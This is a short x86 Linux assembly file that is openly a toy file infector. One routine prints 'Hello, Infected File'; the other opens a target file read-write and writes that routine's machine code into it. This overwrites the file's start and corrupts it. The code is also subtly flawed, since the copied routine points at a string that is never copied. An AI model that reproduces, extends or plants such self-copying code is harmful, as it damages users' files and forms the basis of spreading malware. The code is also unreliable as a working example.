section .data
    msg db "Hello, Infected File", 10
    msg_len equ $ - msg

section .text
global infection, infector

infection:
    mov eax, 4
    mov ebx, 1
    mov ecx, msg
    mov edx, msg_len
    int 0x80
    ret

infector:
    mov eax, 5
    mov ebx, [esp + 4]
    mov ecx, 0x102
    int 0x80
    mov edi, eax

    mov eax, 4
    mov ebx, edi
    mov ecx, infection
    mov edx, code_end - infection
    int 0x80

    mov eax, 6
    mov ebx, edi
    int 0x80
    ret

code_end:
